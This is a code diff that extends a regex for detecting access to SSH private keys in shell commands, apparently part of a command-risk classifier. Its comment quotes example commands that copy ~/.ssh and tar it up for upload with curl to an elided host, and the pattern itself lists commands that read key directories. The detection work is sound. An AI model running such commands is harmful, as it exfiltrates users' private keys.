@@ -197,8 +197,23 @@ ENV_FILE = re.compile(
     re.IGNORECASE | re.MULTILINE,
 )
 
+# `.ssh[/\\]` required a separator *after* the directory name, so a named key
+# matched and the directory holding every key did not: `cp -r ~/.ssh /tmp/k`
+# and `tar czf - ~/.ssh | curl -T - https://...` both produced no traits at all.
+# Taking the whole directory is the natural way to take every key at once, so
+# the shape that mattered most was the one being missed.
+#
+# Anchored the same way ENV_FILE is, and for the same reason: a bare `.ssh` is
+# short enough to appear in prose, and `git commit -m "docs: explain .ssh
+# setup"` must not read as a credential access. It has to look like a path, or
+# follow something that copies or reads one.
 PRIVATE_KEY_PATH = re.compile(
-    r"\bid_(?:rsa|ed25519|dsa|ecdsa)\b|\.pem\b|-----BEGIN\b|\.ssh[/\\]",
+    r"\bid_(?:rsa|ed25519|dsa|ecdsa)\b|"
+    r"\.pem\b|"
+    r"-----BEGIN\b|"
+    r"[\w.~$-]*[/\\]\.ssh\b|"
+    r"\b(?:cd|cp|mv|tar|zip|gzip|rsync|scp|ls|cat|chmod|find)"
+    r"\s+(?:-[-\w]+\s+)*\.ssh\b",
     re.IGNORECASE,
 )
 
